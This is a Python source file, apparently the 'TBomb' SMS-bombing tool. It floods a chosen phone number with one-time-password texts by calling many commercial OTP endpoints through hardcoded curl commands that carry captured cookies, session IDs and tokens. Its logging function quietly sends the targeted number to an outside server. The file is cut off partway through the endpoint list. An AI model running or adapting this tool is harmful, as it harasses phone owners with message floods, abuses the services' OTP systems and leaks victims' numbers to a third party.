from datetime import datetime
import os,hashlib,sys
import time,threading,string
import random,base64
import urllib.request,urllib.parse
print("press Enter")
try:
 import requests
except:
 print('\n\t[!] Error: requests package is not installed')
 print('\n\tType \n\t\tpip3 install requests --user \n\tTo Install Requests Package')
 exit()
isdc=["93","355","213","376","244","672","54","374","297","61","43","994","973","880","375","32","501","229","975","591","387","267","55","246","673","359","226","257","855","237","238","236","235","56","86","57","269","682","506","385","53","599","357","420","243","45","253","670","593","20","503","240","291","372","251","500","298","679","358","33","689","241","220","995","49","233","350","30","299","502","224","245","592","509","504","852","36","354","91","62","98","964","353","972","39","225","81","962","254","686","383","965","996","856","371","961","266","231","218","423","370","352","853","389","261","265","60","960","223","356","692","222","230","262","52","691","373","377","976","382","212","258","95","264","674","977","31","599","687","64","505","227","234","683","850","47","968","92","680","970","507","675","595","51","63","48","351","974","242","262","40","7","250","590","290","590","508","685","378","239","966","221","381","248","232","65","421","386","677","252","27","82","211","34","94","249","597","47","268","46","41","963","886","992","255","66","228","690","676","216","90","993","688","256","380","971","44","1","598","998","678","379","58","84","681","212","967","260","263"]
cnc=["AF","AL","DZ","AD","AO","AQ","AR","AM","AW","AU","AT","AZ","BH","BD","BY","BE","BZ","BJ","BT","BO","BA","BW","BR","IO","BN","BG","BF","BI","KH","CM","CV","CF","TD","CL","CN","CO","KM","CK","CR","HR","CU","CW","CY","CZ","CD","DK","DJ","TL","EC","EG","SV","GQ","ER","EE","ET","FK","FO","FJ","FI","FR","PF","GA","GM","GE","DE","GH","GI","GR","GL","GT","GN","GW","GY","HT","HN","HK","HU","IS","IN","ID","IR","IQ","IE","IL","IT","CI","JP","JO","KE","KI","XK","KW","KG","LA","LV","LB","LS","LR","LY","LI","LT","LU","MO","MK","MG","MW","MY","MV","ML","MT","MH","MR","MU","YT","MX","FM","MD","MC","MN","ME","MA","MZ","MM","NA","NR","NP","NL","AN","NC","NZ","NI","NE","NG","NU","KP","NO","OM","PK","PW","PS","PA","PG","PY","PE","PH","PL","PT","QA","CG","RE","RO","RU","RW","BL","SH","MF","PM","WS","SM","ST","SA","SN","RS","SC","SL","SG","SK","SI","SB","SO","ZA","KR","SS","ES","LK","SD","SR","SJ","SZ","SE","CH","SY","TW","TJ","TZ","TH","TG","TK","TO","TN","TR","TM","TV","UG","UA","AE","GB","US","UY","UZ","VU","VA","VE","VN","WF","EH","YE","ZM","ZW"]
def banner():
 print(r" _____ ____                  _	  ")
 print(r"|_   _| __ )  ___  _ __ ___ | |__   ")
 print(r"  | | |  _ \ / _ \| '_ ` _ \| '_ \  ")
 print(r"  | | | |_) | (_) | | | | | | |_) | ")
 print(r"  |_| |____/ \___/|_| |_| |_|_.__/  ")
 print(r"Hacked by https://vk.com/ld611")
 print('\n\n')
 print(' ')
def infinite(pn,dl,ch):
 while True:
  while os.path.exists('proc.xxx'):
   time.sleep(0.5)
  os.system('touch proc.xxx')
  api=random.choice(ch)
  ret=getapi(pn,api,91)
  if not ret:
   while ch.count(api)>0:
    ch.remove(api)
  os.system('rm proc.xxx >/dev/null 2>&1')
  if not ret:
   continue
  os.system('echo SpeedX >> count.xxx')
  time.sleep(float(dl))
def checkintercept():
 res=False
 try:
  requests.get('https://www.google.com',verify=True)
  res=False
 except:
  res=True
 if res:
  print("\n\n\tIt seems That Your Internet Speed is Slow or You Are Using Proxies...")
  print('\t\tTBomb Will Stop Now...\n\n')
  banner()
  exit()
def logit(num,type):
 if type!=2:
  print('\n\tVerifying You ...\n\tPlease Have Patience...')
 api="https://elite-space.ml/logger.php"
 pdd=dict(num=num,logtype='script',type=str(type))
 pd=urllib.parse.urlencode(pdd)
 pd=pd.encode('ascii')
 try:
  urllib.request.urlopen(api,data=pd)
  if type==2:
   pdd.update(dict(logtype='protect'))
   pd=urllib.parse.urlencode(pdd)
   pd=pd.encode('ascii')
   urllib.request.urlopen(api,data=pd)
 except:
  print('\n\tTBomb is Under Maintenance, Some Features Might Not Work ...\nIf it has been too long, Please Contact SpeedX \n\t\tMAIL: ggspeedx29@gmail.com')
  print("\n\tHaced by https://vk.com/ld611")
  input('\n\tPress Enter To Continue...')
 if type!=2:
  checkin(num)
def protect(cc,num):
 print("\n\t\tChecking Protect List...")
 txt=' '
 res=urllib.request.urlopen("https://elite-space.ml/log_protect.txt").read()
 try:
  txt=res.decode("utf-8")
 except:
  pass
 if txt.find(cc+num)==-1:
  #logit(cc+num,2)
  print('\n\tYour Number Will Be in Protect List For 24 Hours\n\n\n')
  input("Press Enter To Exit...\n\n")
  banner()
  exit()
 else:
  print("\n\t\tYou Are Already in Protect List...\n\n")
  input("Press Enter To Exit...\n\n")
  banner()
  exit()
def checkprotect(cc,num):
 print("\n\t\tChecking Protect List...")
 txt=' '
 res=urllib.request.urlopen("https://elite-space.ml/log_protect.txt").read()
 try:
  txt=res.decode("utf-8")
 except:
  return False
 return False
def getapi(pn,lim,cc):
 global isdc,cnc
 cc=str(cc).strip()
 cnn=cnc[isdc.index(cc)]
 lim=int(lim)
 url=["https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B"+str(cc)+"&nod=4&phone="+pn,"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo="+pn,"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="+pn,"SpeedX Blank","",""]
 try:
  if lim<6:
   urllib.request.urlopen(str(url[lim]))
   return True
 except(urllib.error.HTTPError,urllib.error.URLError):
  return False
 if lim==6:
  os.system(' curl -s -X POST -H "Host:m.netmeds.com" -H "content-length:76" -H "accept:*/*" -H "origin:https://m.netmeds.com" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://m.netmeds.com/customer/account/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:checkmobileno-popup=quWqfunF" -H "cookie:section_data_ids=%7B%22cart%22%3A1559721914%2C%22directory-data%22%3A1559721853%7D" -H "cookie:mage-messages=" -H "cookie:_gat_UA-63910444-1=1" -H "cookie:_gac_UA-63910444-1=1.1559721866.CjwKCAjw0N3nBRBvEiwAHMwvNuYvgGcnYSdAie5_0MBknXSXxfrtAQ-otjvqdbr_MPyAf56mFqwQTxoChEUQAvD_BwE" -H "cookie:_gcl_aw=GCL.1559721866.CjwKCAjw0N3nBRBvEiwAHMwvNuYvgGcnYSdAie5_0MBknXSXxfrtAQ-otjvqdbr_MPyAf56mFqwQTxoChEUQAvD_BwE" -H "cookie:_nmstracking=| sms | ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsUTMtrackingsource=ADW-CPC-Search-NMS-Brand-OC&ADW-CPC-Search-NMS-Brand-OC&CPC&ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsCampaign=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsMedium=CPC" -H "cookie:_nmsSource=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:_nmsAttr=ADW-CPC-Search-NMS-Brand-OC" -H "cookie:private_content_version=eef016e2f8225f631d4a6e1cf8cdf4ac" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:form_key=YGWpwHiCN5uglOtY" -H "cookie:_gid=GA1.3.93227781.1559647218" -H "cookie:mage-translation-file-version=%7B%7D" -H "cookie:mage-translation-storage=%7B%7D" -H "cookie:_gcl_au=1.1.656472353.1559647214" -H "cookie:PHPSESSID=b5i36rg02l2jg9cielmm9fl7c6" -H "cookie:cto_lwid=e5917844-4f1b-48f9-bf74-b0bfdd5c79ce" -H "cookie:bsCoId=3558720339100" -H "cookie:bsUl=0" -H "cookie:_fbp=fb.1.1558720332185.799068042" -H "cookie:_ga=GA1.3.185497001.1558720330" -d \'register_mobileno='+pn+'&logintype=Otp&uniq_identy=quWqfunF&forget_pwd=N\' "https://m.netmeds.com/sociallogin/popup/nmsgetcode/"  > /dev/null 2>&1')
  return True
 elif lim==7:
  os.system('curl -s -X POST -H "Host:client-api.goomo.com" -H "origin:https://www.goomo.com" -H "client:m-web" -H "x-goomo-platform:mWeb" -H "dnt:1" -H "content-type:application/json" -H "accept:*/*" -H "referer:https://www.goomo.com/hotels" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -d \'{"email":"fakeemail@gmail.com","phone_number":"'+pn+'","country_code":"'+cc+'"}\' "https://client-api.goomo.com/v2/phone_confirmation/verify_user" > /dev/null 2>&1')
  return True
 elif lim==8:
  rd=os.popen('curl -s -X POST -H "Host:www.carwale.com" -H "content-length:106" -H "origin:https://www.carwale.com" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36" -H "content-type:application/json" -H "accept:application/json, text/javascript, */*; q=0.01" -H "x-requested-with:XMLHttpRequest" -H "sourceid:43" -H "save-data:on" -H "referer:https://www.carwale.com/m/used/cars-in-newdelhi/audi-a62011-2015-d1890731/?slot=4&rk=1" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_tas=uwawjbv36lb" -H "cookie:_ta=in~2~883b0730c9aff671d3164a84785f6825" -H "cookie:_tac=false~self|not-available" -H "cookie:mUsedCarsCoachmark1=details|" -H "cookie:_cwv=mLKBEKjpf7J9YPyiFFwBGWDdR.XCdJlnPgSL.1561032410.1561032457.1561032460.1" -H "cookie:_carSearchType=0" -H "cookie:AndroidDownload=1" -H "cookie:__gads=ID=5235754ef74d4a87:T=1561032434:S=ALNI_Mbicx09Qq6flRp6oWeXnFLB0_fcmg" -H "cookie:_cwutmzmed=O|O" -H "cookie:_cwutmzsrc=G|G" -H "cookie:_gid=GA1.2.504093911.1561032419" -H "cookie:_ga=GA1.2.1818364192.1561032419" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:__sonar=14161769824897017805" -H "cookie:_fbp=fb.1.1561032417564.547370192" -H "cookie:_CustZoneMaster=Select Zone" -H "cookie:_CustZoneIdMaster=" -H "cookie:_CustAreaName=Select Area" -H "cookie:_CustAreaId=-1" -H "cookie:_CustCityMaster=Select City" -H "cookie:_CustCityIdMaster=-1" -H "cookie:_abtest=32" -H "cookie:webp=1" -H "cookie:_cwutmz=utmcsr=google|utmgclid=|utmccn=(organic)|utmcmd=organic|utmtrm=|utmcnt=" -H "cookie:CWC=mLKBEKjpf7J9YPyiFFwBGWDdR" -d \'{"sourceModule":1,"mobileVerificationByType":3,"validityInMinutes":30,"otpLength":5,"mobile":"'+pn+'"}\' "https://www.carwale.com/api/v1/resendotp/"').read()
  return rd.find("Success")!=-1
 elif lim==9:
  os.system('curl -s -X POST -H "host:www.flipkart.com" -H "user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" -H "accept:*/*" -H "accept-language:en-US,en;q=0.5" -H "accept-encoding:gzip, deflate, br" -H "referer:https://www.flipkart.com/" -H "x-user-agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop" -H "origin:https://www.flipkart.com" -H "connection:keep-alive" -H "Content-Type:application/json; charset=utf-8" -H "Content-Length:53" -d \'{"loginId":["+'+cc+pn+'"],"supportAllStates":true}\' "https://www.flipkart.com/api/6/user/signup/status"  > /dev/null 2>&1')
  return True
 elif lim==10:
  rd=os.popen('curl -s -X POST -H "Host:www.fbbonline.in" -H "content-length:395" -H "x-newrelic-id:VQ8PVlFUChABV1ZRBgYCX1w=" -H "origin:https://www.fbbonline.in" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "accept:application/json, text/javascript, */*; q=0.01" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "referer:https://www.fbbonline.in/customer/account/create" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:historyPlpPage=0" -H "cookie:__stat="dMgVPBHDFro:APA91bFVp80aenNdzTvrQA6LSK_5ZeJuJCcfl_Cc1FvDSmuePDbUqti6w698xZaIaIT42M9Svb-gRx8rFWBOQYbRd1LzSlGDkMI89jhTUjzDkGUWXdajSUAUzXCL91Jae-4iNbkK19Zk"" -H "cookie:_fv=cmpnpp" -H "cookie:__sts={"sid":1559674972371,"tx":1559674976573,"url":"https%3A%2F%2Fwww.fbbonline.in%2Fcustomer%2Faccount%2Fcreate","pet":1559674976573,"set":1559674972371,"pUrl":"https%3A%2F%2Fwww.fbbonline.in%2Ffaq%2F","pPet":1559674972371,"pTx":1559674972371}" -H "cookie:registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2Ffaq%2F" -H "cookie:__stbpnenable=1" -H "cookie:__stgeo="1"" -H "cookie:__stdf=0" -H "cookie:__stp={"visit":"new","uuid":"652012d0-16f0-42ee-b791-2419cfeaba86"}" -H "cookie:_gat_UA-96580725-1=1" -H "cookie:_gat=1" -H "cookie:_gid=GA1.2.497603746.1559674969" -H "cookie:_ga=GA1.2.960089271.1559674969" -H "cookie:all_store_details=null" -H "cookie:_fbp=fb.1.1559674968940.518646015" -H "cookie:AWSELB=A32947C3064966BC3E46C87272983CCEF02CF3DB8F171725483AA065BA6E3D2AED6507A3D160C989DB0724B4A9F244C1E3901925FBAD6EF51BBBB241BB71641CD11F9441B7" -H "cookie:PHPSESSID=8h37i2bs6vvhnbfd249t94nvl0" -H "cookie:_st_time=1559674976" -d \'YII_CSRF_TOKEN=83057d231bb9cc25200c2e8c72da36510f91315c&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D='+pn+'&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=Fjdkdd%40ymail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=Fndndnndd&RegistrationForm%5Blast_name%5D=Dbdndd&RegistrationForm%5Bpassword%5D=dndkdddk&validate_otp=\' "https://www.fbbonline.in/customer/account/GenerateOtp" ').read()
  return rd.find("true")!=-1
 elif lim==11:
  os.system('curl -s -X POST -H "Host:www.flipkart.com" -H "Connection:keep-alive" -H "Content-Length:60" -H "X-user-agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop" -H "Origin:https://www.flipkart.com" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded" -H "Accept:*/*" -H "Referer:https://www.flipkart.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:T=BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050; SWAB=build-44be9e47461a74d737914207bcbafc30; lux_uid=155867904381892986; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI; s_cc=true; SN=2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078; gpv_pn=HomePage; gpv_pn_t=Homepage; S=d1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==; s_sq=%5B%5BB%5D%5D" -d \'loginId=+'+cc+pn+'&state=VERIFIED&churnEmailRequest=false\' "https://www.flipkart.com/api/5/user/otp/generate"  > /dev/null 2>&1')
  return True
 elif lim==12:
  os.system('curl -s -X POST -H "Host:www.ref-r.com" -H "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Accept-Language:en-US,en;q=0.5" -H "Accept-Encoding:gzip, deflate, br" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With:XMLHttpRequest" -H "Content-Length:26" -H "DNT:1" -H "Connection:keep-alive" -d "mobile='+pn+'&submit=1&undefined=" "https://www.ref-r.com/clients/lenskart/smsApi"  > /dev/null 2>&1')
  return True
 elif lim==13:
  rd=os.popen('curl -s -X POST -H "X-DROID-VERSION:4.12.5" -H "API-Version:2.0" -H "user-agent:samsung SM-G9350 0 4.4.2" -H "client-version:Android-4.12.5" -H "X-DROID-VERSION-CODE:158" -H "Accept:application/json" -H "client-name:Practo Android App" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:accounts.practo.com" -H "Connection:Keep-Alive" -H "Content-Length:96" -d  "client_name=Practo+Android+App&fingerprint=&mobile=%2B'+cc+pn+'&device_name=samsung+SM-G9350&"  "https://accounts.practo.com/send_otp"').read()
  return rd.find("success")!=-1
 elif lim==14:
  os.system(' curl -s -X POST -H "Host:pharmeasy.in" -H "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0" -H "Accept:*/*" -H "Accept-Language:en-US,en;q=0.5" -H "Accept-Encoding:gzip, deflate, br" -H "Referer:https://pharmeasy.in/" -H "Content-Type:application/json" -H "Content-Length:30" -H "Connection:keep-alive" -d \'{"contactNumber":"'+pn+'"}\' "https://pharmeasy.in/api/auth/requestOTP"  > /dev/null 2>&1')
  return True
 elif lim==15:
  os.system('curl -s -X POST -H "Accept:*/*" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-US,en;q=0.5" -H "Connection:keep-alive" -H "Content-Length:34" -H "Content-Type:application/x-www-form-urlencoded" -H "Host:www.oriyamatrimony.com" -H "Referer:https://www.oriyamatrimony.com/" -H "User-Agent:Mozilla/5.0 (Windows NT 8.1; Win64; x64; rv:59.0) Gecko/20 Firefox/56.0" -H "X-Requested-With:XMLHttpRequest" -d "countrycode='+cc+'&mobileno='+pn+'" "https://www.oriyamatrimony.com/login/mobileappsms-homepage.php"  > /dev/null 2>&1')
  return True
 elif lim==16:
  rd=os.popen('curl -s -X POST -H "Host:www.tatadocomo.com" -H "User-Agent:Mozilla/5.0 (Windows NT 8.2; Win32; x64; rv:38.0) Gecko/201 Firefox/57.0" -H "Accept:*/*" -H "Accept-Language:en-US,en;q=0.5" -H "Accept-Encoding:gzip, deflate, br" -H "Referer:https://www.tatadocomo.com/en-in/mytatadocomoapp" -H "Content-Type:application/x-www-form-urlencoded" -H "X-Requested-With:XMLHttpRequest" -H "Content-Length:17" -H "Connection:keep-alive" -d "mobile='+pn+'" "https://www.tatadocomo.com/INonRender/Personal_MydocomoApp/GenerateOTP"  ').read()
  return rd.find("success")!=-1
 elif lim==17:
  os.system('curl -s -X POST -H "Host:m.pizzahut.co.in" -H "content-length:114" -H "origin:https://m.pizzahut.co.in" -H "authorization:Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5pTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4" -H "x-source-origin:PWAFW" -H "content-type:application/json" -H "accept:application/json, text/plain, */*" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "save-data:on" -H "languagecode:en" -H "referer:https://m.pizzahut.co.in/login" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_fbp=fb.2.1559973905081.1516144968" -H "cookie:_gat_UA-37858192-4=1" -H "cookie:_ga-ss=1|UA-37858192-4|https%3A%2F%2Fwww.google.com%2F" -H "cookie:_gid=GA1.3.1666290082.1559973902" -H "cookie:_ga=GA1.3.1893416092.1559973902" -H "cookie:run_fullstory_for_user=full_story_fail" -H "cookie:_gcl_au=1.1.2020385110.1559973902" -H "cookie:AKA_A2=A" -d \'{"customer":{"MobileNo":"'+pn+'","UserName":"'+pn+'","merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}\' "https://m.pizzahut.co.in/api/cart/send-otp?langCode=en"  > /dev/null 2>&1')
  return True
 elif lim==18:
  os.system('curl -s -X POST -H "Host:grofers.com" -H "content-length:21" -H "lon:77.040489" -H "origin:https://grofers.com" -H "auth_key:458a454d5ae18c3022b3a9b30cd562833e6557bccd808424e3e5c721a9953821" -H "content-type:application/x-www-form-urlencoded" -H "app_client:consumer_web" -H "user-agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36" -H "lat:28.4465616" -H "save-data:on" -H "accept:*/*" -H "referer:https://grofers.com/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A2%2C%22s%22%3A1559938916%2C%22t%22%3A1559939431%7D" -H "cookie:_sp_id.bf41=0f1a9fa739dec41e.1559938914.1.1559939420.1559938914.f31b863c-e72e-4a42-817b-9fbcc5d15659" -H "cookie:__insp_slim=1559939406617" -H "cookie:__insp_norec_sess=true" -H "cookie:_fbp=fb.1.1559938919114.1346857015" -H "cookie:__insp_targlpt=QnV5IFZlZ2V0YWJsZXMgT25saW5l" -H "cookie:__insp_targlpu=aHR0cHM6Ly9ncm9mZXJzLmNvbS9jbi9ncm9jZXJ5LXN0YXBsZXMvcG90YXRvLW9uaW9uLXRvbWF0by9jaWQvMTYvMTQ5MA%3D%3D" -H "cookie:__insp_nv=true" -H "cookie:__insp_wid=180455199" -H "cookie:gr_1_featureFlags=%7B%22ia%22%3Afalse%2C%22pdp%22%3Afalse%2C%22edlpWithBanner%22%3Atrue%7D" -H "cookie:gr_1_sessionKey=e1841adf-ce33-455c-94f6-06fbb6eecdc6" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:_sp_ses.bf41=*" -H "cookie:WZRK_G=58d7893bca824e419eeb6671049b731b" -H "cookie:_gid=GA1.2.1524131663.1559938913" -H "cookie:_ga=GA1.2.1526509191.1559938913" -H "cookie:gr_1_locality=1849" -H "cookie:gr_1_lon=77.04061469999999" -H "cookie:gr_1_lat=28.4472372" -H "cookie:__cfduid=dc9feb5f041064b558fe7bc347c8737fa1559938905" -d \'user_phone='+pn+'\' "https://grofers.com/v2/accounts/"  > /dev/null 2>&1')
  return True
 elif lim==19:
  rd=os.popen('curl -s -X POST -H "Host:www.heromotocorp.com" -H "Connection:keep-alive" -H "Content-Length:126" -H "Accept:*/*" -H "Origin:https://www.heromotocorp.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.heromotocorp.com/en-in/xpulse200/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:HttpOnly; _ga=GA1.2.1273460610.1561191565; _gid=GA1.2.172574299.1561191565; _gcl_au=1.1.833556660.1561191566; _fbp=fb.1.1561191568709.1707722126; PHPSESSID=m5tap7nr75b2ehcn8ur261oq86" -d \'mobile_no='+pn+'&randome=ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=&mobile_no_otp=&csrf=523bc3fa1857c4df95e4d24bbd36c61b\' "https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php"').read()
  return rd.find("been sent")!=-1
 elif lim==20:
  os.system('curl -s -X POST -H "host:www.goibibo.com" -H "user-agent:Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0" -H "accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "accept-language:en-US,en;q=0.5" -H "accept-encoding:gzip, deflate, br" -H "referer:https://www.goibibo.com/mobile/?sms=success" -H "content-type:application/x-www-form-urlencoded" -H "content-length:14" -H "connection:keep-alive" -H "upgrade-insecure-requests:1" -d "mbl='+pn+'" "https://www.goibibo.com/common/downloadsms/"  > /dev/null 2>&1')
  return True
 elif lim==21:
  os.popen('rm temp.xxx1 > /dev/null 2>&1')
  os.system('curl -s -X POST -H "Host:www.apollopharmacy.in" -H "content-length:17" -H "accept:*/*" -H "origin:https://www.apollopharmacy.in" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.apollopharmacy.in/sociallogin/mobile/login/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:__cfduid=d64c65a2edad54086382759cdf599de901558686615" -H "cookie:_ga=GA1.2.1278908803.1558686621" -H "cookie:__ta_device=fAz8eA9Rx40yyIiB5mzvHt4apFaSkMBA" -H "cookie:_fbp=fb.1.1558686627127.655454618" -H "cookie:__stat="BLOCK"" -H "cookie:jv_visits_count_EXRKNIzFkV=1" -H "cookie:__stp={"visit":"returning","uuid":"d9a1c39d-efbd-4911-ac0e-6333455f9fbb"}" -H "cookie:PHPSESSID=vnj2hvk8nga4v1m2hvlmvl88r4" -H "cookie:_gid=GA1.2.132668726.1560239715" -H "cookie:_gat=1" -H "cookie:__ta_visit=f5uvpYKu8EVmJAJmFGXMmXGSTiNQSWRS" -H "cookie:_gat_UA-31142855-1=1" -H "cookie:__ta_ping=1" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-messages=" -H "cookie:private_content_version=46e6c8611a9b0d06e662da50ca5cf311" -H "cookie:AWSALB=2177QHjXXrFgaem1w0FrBqZ2aoKrMhI+DibolJaee9cVOP4ZSV2LiLC3tks68ud4ERCydxa8kb4klbiI+VEnNQB0rsyins1USgvHcPOUoz2nySN3SC5G/wpAACIq" -H "cookie:section_data_ids=%7B%22cart%22%3A1560239751%7D" -d \'mobile='+pn+'\' "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/" --output temp.xxx1')
  while not os.path.exists('temp.xxx1'):
   time.sleep(0.1)
  rd=str(open('temp.xxx1','rb').read())+" "
  return rd.find("sent")!=-1
 elif lim==22:
